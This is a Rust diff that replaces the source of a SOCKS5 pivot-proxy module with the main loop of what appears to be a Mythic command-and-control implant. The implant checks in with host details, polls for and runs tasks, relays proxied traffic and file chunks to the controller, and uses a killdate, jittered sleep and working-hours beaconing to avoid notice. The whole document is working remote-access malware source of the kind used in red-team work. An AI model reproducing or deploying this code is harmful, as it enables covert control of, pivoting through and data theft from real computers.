@@ -1,308 +1,276 @@
-// socks.rs
-use crate::agent::AgentTask;
-use base64::{decode, encode};
-use once_cell::sync::Lazy;
+// agent.rs
+use crate::payloadvars;
+use crate::tasking::Tasker;
+use crate::profiles::Profile;
+use crate::socks::{SocksMsg, SOCKS_QUEUE};
+use chrono::prelude::{DateTime, Local, NaiveDate, NaiveDateTime, NaiveTime};
+use chrono::Duration;
+use rand::Rng;
 use serde::{Deserialize, Serialize};
-use std::collections::HashMap;
+use serde_json::json;
 use std::error::Error;
-use std::io::{Read, Write};
-use std::io::ErrorKind;
-use std::net::{Ipv4Addr, Ipv6Addr, SocketAddr, TcpStream, ToSocketAddrs};
-use std::sync::{mpsc, Arc, Mutex};
-use std::time::Duration;
 
-// =========================
-// Global SOCKS Queue
-// =========================
-pub static SOCKS_QUEUE: Lazy<Arc<Mutex<Vec<SocksMsg>>>> = Lazy::new(|| Arc::new(Mutex::new(Vec::new())));
+#[cfg(target_os = "linux")]
+use crate::utils::linux as native;
+#[cfg(target_os = "windows")]
+use crate::utils::windows as native;
 
-#[derive(Deserialize, Serialize, Debug, Clone)]
-pub struct SocksMsg {
-    pub exit: bool,
-    pub server_id: u32,
-    pub data: String,
+/// Struct containing each Mythic task
+#[derive(Debug, Deserialize, Serialize, Clone)]
+pub struct AgentTask {
+    pub command: String,
+    pub parameters: String,
+    pub timestamp: f64,
+    pub id: String,
 }
 
-#[derive(Debug)]
-pub struct SocksState {
-    pub connections: Arc<Mutex<HashMap<u32, TcpStream>>>,
+/// Response from Mythic on "get_tasking"
+#[derive(Debug, Deserialize, Serialize)]
+pub struct GetTaskingResponse {
+    pub tasks: Vec<AgentTask>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub socks: Option<Vec<SocksMsg>>,
 }
 
-impl SocksState {
+/// Fallback response structure if the main one fails
+#[derive(Debug, Deserialize, Serialize)]
+pub struct GetTaskingResponseFallback {
+    pub tasks: Vec<AgentTask>,
+}
+
+/// Response to send back to Mythic on "post_response"
+#[derive(Debug, Deserialize, Serialize)]
+pub struct PostTaskingResponse {
+    pub action: String,
+    pub responses: Vec<serde_json::Value>,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub socks: Vec<SocksMsg>,
+}
+
+/// Fallback response structure for post_response if the main one fails
+#[derive(Debug, Deserialize, Serialize)]
+pub struct PostTaskingResponseFallback {
+    pub action: String,
+    pub responses: Vec<serde_json::Value>,
+}
+
+/// Used for holding any data passed to background tasks
+#[derive(Debug, Deserialize, Serialize)]
+pub struct ContinuedData {
+    pub task_id: String,
+    pub status: String,
+    pub error: Option<String>,
+    pub file_id: Option<String>,
+    pub total_chunks: Option<u32>,
+    pub chunk_num: Option<u32>,
+    pub chunk_data: Option<String>,
+}
+
+/// Shared state between threads
+pub struct SharedData {
+    pub sleep_interval: u64,
+    pub jitter: u64,
+    pub exit_agent: bool,
+    pub working_start: NaiveTime,
+    pub working_end: NaiveTime,
+}
+
+/// Main Agent structure
+pub struct Agent {
+    pub shared: SharedData,
+    c2profile: Profile,
+    killdate: NaiveDate,
+    pub tasking: Tasker,
+}
+
+impl Agent {
     pub fn new() -> Self {
+        let c2profile = Profile::new(payloadvars::payload_uuid());
         Self {
-            connections: Arc::new(Mutex::new(HashMap::new())),
+            shared: SharedData {
+                jitter: payloadvars::callback_jitter(),
+                sleep_interval: payloadvars::callback_interval(),
+                exit_agent: false,
+                working_start: payloadvars::working_start(),
+                working_end: payloadvars::working_end(),
+            },
+            c2profile,
+            tasking: Tasker::new(),
+            killdate: NaiveDate::parse_from_str(&payloadvars::killdate(), "%Y-%m-%d").unwrap(),
         }
     }
-}
 
-// =========================
-// Main SOCKS Thread
-// =========================
-pub fn start_socks(
-    tx: &mpsc::Sender<serde_json::Value>,
-    rx: mpsc::Receiver<serde_json::Value>,
-) -> Result<(), Box<dyn Error>> {
-    let state = Arc::new(SocksState::new());
-
-    loop {
-        match rx.recv_timeout(Duration::from_secs(5)) {
-            Ok(msg) => {
-                if let Ok(task) = serde_json::from_value::<AgentTask>(msg) {
-                    if task.command == "socks_data" {
-                        if let Ok(msgs) = serde_json::from_str::<Vec<SocksMsg>>(&task.parameters) {
-                            if let Err(e) = process_socks_messages(msgs, &state) {
-                                eprintln!("SOCKS error: {e}");
-                            }
-                        }
-                    }
-                }
-                // After handling inbound socks_data, flush any responses to the sender
-                drain_socks_queue_and_send(tx);
-            }
-            Err(mpsc::RecvTimeoutError::Timeout) => {
-                // Periodically flush any accumulated SOCKS responses even when idle
-                drain_socks_queue_and_send(tx);
-                continue;
-            }
-            Err(_) => break,
-        }
+    /// Initial checkin with Mythic
+    pub fn make_checkin(&mut self) -> Result<(), Box<dyn Error>> {
+        let json_body = native::get_checkin_info();
+        self.c2profile.initial_checkin(&json_body)?;
+        Ok(())
     }
-    Ok(())
-}
 
-// =========================
-// SOCKS Message Processing
-// =========================
-fn process_socks_messages(
-    msgs: Vec<SocksMsg>,
-    state: &Arc<SocksState>,
-) -> Result<(), Box<dyn Error>> {
-    let mut conns = state.connections.lock().unwrap();
-    let mut responses = Vec::new();
+    /// Request new tasking from Mythic
+    pub fn get_tasking(&mut self) -> Result<Option<Vec<AgentTask>>, Box<dyn Error>> {
+        let json_body = json!({
+            "action": "get_tasking",
+            "tasking_size": -1,
+        })
+        .to_string();
 
-    for msg in msgs {
-        if msg.exit {
-            if let Some(mut stream) = conns.remove(&msg.server_id) {
-                let _ = stream.shutdown(std::net::Shutdown::Both);
-            }
-            continue;
-        }
-
-        let data = decode(&msg.data).unwrap_or_default();
-        if data.is_empty() {
-            continue;
-        }
-
-        if let Some(stream) = conns.get_mut(&msg.server_id) {
-            if stream.write_all(&data).is_err() {
-                responses.push(SocksMsg {
-                    exit: true,
-                    server_id: msg.server_id,
-                    data: String::new(),
-                });
-                conns.remove(&msg.server_id);
-            } else {
-                // Drain available data to reduce fragmentation
-                let mut buf = [0u8; 4096];
-                stream.set_read_timeout(Some(Duration::from_millis(100)))?;
-                loop {
-                    match stream.read(&mut buf) {
-                        Ok(0) => {
-                            responses.push(SocksMsg {
-                                exit: true,
-                                server_id: msg.server_id,
-                                data: String::new(),
-                            });
-                            conns.remove(&msg.server_id);
-                            break;
-                        }
-                        Ok(n) => {
-                            responses.push(SocksMsg {
-                                exit: false,
-                                server_id: msg.server_id,
-                                data: encode(&buf[..n]),
-                            });
-                            // Try to read again until timeout/WouldBlock
-                            continue;
-                        }
-                        Err(e) => {
-                            if e.kind() == ErrorKind::WouldBlock || e.kind() == ErrorKind::TimedOut {
-                                break;
-                            }
-                            break;
-                        }
+        let body = self.c2profile.send_data(&json_body)?;
+        
+        // Debug: Print the received JSON to understand the structure
+        eprintln!("DEBUG: Received JSON from Mythic: {}", body);
+        
+        let response = match serde_json::from_str::<GetTaskingResponse>(&body) {
+            Ok(resp) => resp,
+            Err(e) => {
+                eprintln!("DEBUG: Failed to deserialize GetTaskingResponse, trying fallback: {}", e);
+                // Try fallback structure without socks field
+                match serde_json::from_str::<GetTaskingResponseFallback>(&body) {
+                    Ok(fallback) => GetTaskingResponse {
+                        tasks: fallback.tasks,
+                        socks: None,
+                    },
+                    Err(fallback_err) => {
+                        eprintln!("DEBUG: Fallback also failed: {}", fallback_err);
+                        eprintln!("DEBUG: JSON was: {}", body);
+                        return Err(Box::new(fallback_err));
                     }
                 }
             }
+        };
+
+        let mut all_tasks: Vec<AgentTask> = Vec::new();
+
+        // Handle SOCKS messages from Mythic
+        if let Some(socks_data) = response.socks {
+            if !socks_data.is_empty() {
+                let socks_task = AgentTask {
+                    command: "socks_data".to_string(),
+                    parameters: serde_json::to_string(&socks_data)?,
+                    timestamp: 0.0,
+                    id: "socks_immediate".to_string(),
+                };
+                all_tasks.push(socks_task);
+            }
+        }
+
+        // Normal tasks
+        all_tasks.extend(response.tasks);
+
+        if !all_tasks.is_empty() {
+            Ok(Some(all_tasks))
         } else {
-            if let Some((target_addr, response_data)) = handle_socks_connect(&data) {
-                match TcpStream::connect(&target_addr) {
-                    Ok(mut stream) => {
-                        responses.push(SocksMsg {
-                            exit: false,
-                            server_id: msg.server_id,
-                            data: encode(&response_data),
-                        });
+            Ok(None)
+        }
+    }
 
-                        conns.insert(msg.server_id, stream.try_clone()?);
+    /// Send completed tasks + SOCKS messages back to Mythic
+    pub fn send_tasking(
+        &mut self,
+        completed: &[serde_json::Value],
+    ) -> Result<Option<Vec<AgentTask>>, Box<dyn Error>> {
+        // Retrieve and clear SOCKS queue
+        let socks_to_send = {
+            let mut q = SOCKS_QUEUE.lock().unwrap();
+            let v = q.clone();
+            q.clear();
+            v
+        };
 
-                        let mut buf = [0u8; 4096];
-                        stream.set_read_timeout(Some(Duration::from_millis(100)))?;
-                        loop {
-                            match stream.read(&mut buf) {
-                                Ok(0) => {
-                                    responses.push(SocksMsg {
-                                        exit: true,
-                                        server_id: msg.server_id,
-                                        data: String::new(),
-                                    });
-                                    conns.remove(&msg.server_id);
-                                    break;
-                                }
-                                Ok(n) => {
-                                    responses.push(SocksMsg {
-                                        exit: false,
-                                        server_id: msg.server_id,
-                                        data: encode(&buf[..n]),
-                                    });
-                                    continue;
-                                }
-                                Err(e) => {
-                                    if e.kind() == ErrorKind::WouldBlock || e.kind() == ErrorKind::TimedOut {
-                                        break;
-                                    }
-                                    break;
-                                }
-                            }
-                        }
-                    }
-                    Err(_) => {
-                        let err_resp = build_socks5_error(0x05);
-                        responses.push(SocksMsg {
-                            exit: false,
-                            server_id: msg.server_id,
-                            data: encode(&err_resp),
-                        });
+        let body = PostTaskingResponse {
+            action: "post_response".to_string(),
+            responses: completed.to_owned(),
+            socks: socks_to_send,
+        };
+
+        let req_payload = serde_json::to_string(&body)?;
+        let json_response = self.c2profile.send_data(&req_payload)?;
+        
+        // Debug: Print the received JSON to understand the structure
+        eprintln!("DEBUG: Received JSON response from send_tasking: {}", json_response);
+        
+        let response = match serde_json::from_str::<PostTaskingResponse>(&json_response) {
+            Ok(resp) => resp,
+            Err(e) => {
+                eprintln!("DEBUG: Failed to deserialize PostTaskingResponse, trying fallback: {}", e);
+                // Try fallback structure without socks field
+                match serde_json::from_str::<PostTaskingResponseFallback>(&json_response) {
+                    Ok(fallback) => PostTaskingResponse {
+                        action: fallback.action,
+                        responses: fallback.responses,
+                        socks: Vec::new(),
+                    },
+                    Err(fallback_err) => {
+                        eprintln!("DEBUG: Fallback also failed: {}", fallback_err);
+                        eprintln!("DEBUG: JSON was: {}", json_response);
+                        return Err(Box::new(fallback_err));
                     }
                 }
-            } else {
-                let err_resp = build_socks5_error(0x07);
-                responses.push(SocksMsg {
-                    exit: false,
-                    server_id: msg.server_id,
-                    data: encode(&err_resp),
-                });
             }
+        };
+
+        // Handle continued tasks
+        let mut pending_tasks: Vec<AgentTask> = Vec::new();
+        for resp in response.responses {
+            let continued: ContinuedData = serde_json::from_value(resp)?;
+            pending_tasks.push(AgentTask {
+                command: "continued_task".to_string(),
+                parameters: serde_json::to_string(&continued)?,
+                timestamp: 0.0,
+                id: continued.task_id,
+            });
+        }
+
+        if !pending_tasks.is_empty() {
+            Ok(Some(pending_tasks))
+        } else {
+            Ok(None)
         }
     }
 
-    if !responses.is_empty() {
-        let mut q = SOCKS_QUEUE.lock().unwrap();
-        q.extend(responses);
-    }
+    /// Sleep function with jitter and working hours
+    pub fn sleep(&mut self) {
+        let now: DateTime<Local> = std::time::SystemTime::now().into();
+        let now: NaiveDateTime = now.naive_local();
 
-    Ok(())
+        if now.date() >= self.killdate {
+            self.shared.exit_agent = true;
+        }
+
+        let jitter = self.shared.jitter;
+        let interval = self.shared.sleep_interval;
+        let sleep_time = calculate_sleep_time(interval, jitter);
+        std::thread::sleep(std::time::Duration::from_secs(sleep_time));
+
+        // Respect working hours
+        let working_start = NaiveDateTime::new(now.date(), self.shared.working_start);
+        let working_end = NaiveDateTime::new(now.date(), self.shared.working_end);
+
+        if working_end != working_start {
+            let mut sleep_dur = std::time::Duration::from_secs(0);
+            if now < working_start {
+                let delta = Duration::seconds(
+                    working_start.and_utc().timestamp() - now.and_utc().timestamp(),
+                );
+                sleep_dur = delta.to_std().unwrap();
+            } else if now > working_end {
+                let next_start = working_start.checked_add_signed(Duration::days(1)).unwrap();
+                let delta = Duration::seconds(
+                    next_start.and_utc().timestamp() - now.and_utc().timestamp(),
+                );
+                sleep_dur = delta.to_std().unwrap();
+            }
+            std::thread::sleep(sleep_dur);
+        }
+    }
 }
 
-// =========================
-// SOCKS5 Parsing Helpers
-// =========================
-fn handle_socks_connect(data: &[u8]) -> Option<(SocketAddr, Vec<u8>)> {
-    if data.len() < 10 {
-        return None;
+/// Sleep time with jitter logic
+pub fn calculate_sleep_time(interval: u64, jitter: u64) -> u64 {
+    let jitter = (rand::thread_rng().gen_range(0..=jitter) as f64) / 100.0;
+    if (rand::random::<u8>()) % 2 == 1 {
+        interval + (interval as f64 * jitter) as u64
+    } else {
+        interval - (interval as f64 * jitter) as u64
     }
-    if data[0] != 0x05 || data[1] != 0x01 || data[2] != 0x00 {
-        return None;
-    }
-
-    let atyp = data[3];
-    let addr = match atyp {
-        0x01 => {
-            if data.len() < 10 {
-                return None;
-            }
-            let ip = Ipv4Addr::new(data[4], data[5], data[6], data[7]);
-            let port = u16::from_be_bytes([data[8], data[9]]);
-            SocketAddr::from((ip, port))
-        }
-        0x03 => {
-            let domain_len = data[4] as usize;
-            if data.len() < 5 + domain_len + 2 {
-                return None;
-            }
-            let domain = String::from_utf8_lossy(&data[5..5 + domain_len]);
-            let port = u16::from_be_bytes([data[5 + domain_len], data[5 + domain_len + 1]]);
-            let addr = (domain.as_ref(), port)
-                .to_socket_addrs()
-                .ok()?
-                .next()?;
-            addr
-        }
-        0x04 => {
-            if data.len() < 22 {
-                return None;
-            }
-            let mut octets = [0u8; 16];
-            octets.copy_from_slice(&data[4..20]);
-            let ip = Ipv6Addr::from(octets);
-            let port = u16::from_be_bytes([data[20], data[21]]);
-            SocketAddr::from((ip, port))
-        }
-        _ => return None,
-    };
-
-    let response = build_socks5_success(addr);
-    Some((addr, response))
-}
-
-fn build_socks5_success(addr: SocketAddr) -> Vec<u8> {
-    let mut res = vec![0x05, 0x00, 0x00];
-    match addr {
-        SocketAddr::V4(v4) => {
-            res.push(0x01);
-            res.extend_from_slice(&v4.ip().octets());
-            res.extend_from_slice(&v4.port().to_be_bytes());
-        }
-        SocketAddr::V6(v6) => {
-            res.push(0x04);
-            res.extend_from_slice(&v6.ip().octets());
-            res.extend_from_slice(&v6.port().to_be_bytes());
-        }
-    }
-    res
-}
-
-fn build_socks5_error(code: u8) -> Vec<u8> {
-    vec![0x05, code, 0x00, 0x01, 0, 0, 0, 0, 0, 0]
-}
-
-// =========================
-// Outbound Queue Drainer
-// =========================
-fn drain_socks_queue_and_send(tx: &mpsc::Sender<serde_json::Value>) {
-    // Drain the global queue and send a single aggregated message upstream
-    let msgs: Vec<SocksMsg> = {
-        let mut q = SOCKS_QUEUE.lock().unwrap();
-        if q.is_empty() {
-            return;
-        }
-        q.drain(..).collect()
-    };
-
-    if msgs.is_empty() {
-        return;
-    }
-
-    let params = match serde_json::to_string(&msgs) {
-        Ok(s) => s,
-        Err(_) => String::from("[]"),
-    };
-
-    let payload = serde_json::json!({
-        "command": "socks_data",
-        "parameters": params,
-    });
-
-    let _ = tx.send(payload);
 }
